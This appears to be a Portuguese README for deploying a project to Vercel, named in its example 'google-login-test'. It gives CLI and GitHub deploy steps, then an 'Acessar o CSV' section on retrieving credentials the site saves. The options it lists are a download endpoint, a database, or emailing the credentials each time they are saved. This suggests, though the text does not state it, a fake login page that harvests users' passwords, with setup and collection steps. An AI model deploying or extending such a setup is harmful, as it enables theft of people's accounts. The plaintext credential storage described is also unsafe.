# Deploy na Vercel

## Passo a passo para fazer deploy:

### 1. Instalar Vercel CLI (se ainda não tiver)
```bash
npm install -g vercel
```

### 2. Fazer login na Vercel
```bash
vercel login
```

### 3. Deploy
No diretório do projeto, execute:
```bash
vercel
```

Siga as instruções:
- **Set up and deploy?** → Y
- **Which scope?** → Selecione sua conta
- **Link to existing project?** → N (primeira vez)
- **What's your project's name?** → Escolha um nome (ex: google-login-test)
- **In which directory is your code located?** → ./ (pressione Enter)

### 4. Deploy em produção
```bash
vercel --prod
```

## Alternativa: Deploy via GitHub

1. Crie um repositório no GitHub
2. Faça push do código:
```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin SEU_REPO_URL
git push -u origin main
```

3. Acesse [vercel.com](https://vercel.com)
4. Clique em "New Project"
5. Importe o repositório do GitHub
6. A Vercel detectará automaticamente as configurações
7. Clique em "Deploy"

## Acessar o CSV

⚠️ **IMPORTANTE**: Na Vercel, o arquivo CSV será salvo em `/tmp`, que é um sistema de arquivos temporário. 

**Para acessar as credenciais salvas, você tem algumas opções:**

### Opção 1: Adicionar endpoint para download
Crie um endpoint `/api/download-csv` que retorne o arquivo CSV (protegido por senha).

### Opção 2: Usar banco de dados
Migre para um banco de dados (MongoDB, PostgreSQL, etc.) para persistência permanente.

### Opção 3: Enviar por email
Configure para enviar as credenciais por email sempre que forem salvas.

## URLs

Após o deploy, você receberá uma URL como:
- `https://seu-projeto.vercel.app`

## Variáveis de Ambiente

Se precisar de variáveis de ambiente, configure na dashboard da Vercel ou use:
```bash
vercel env add NOME_DA_VARIAVEL
```

## Logs

Para ver os logs em tempo real:
```bash
vercel logs
```
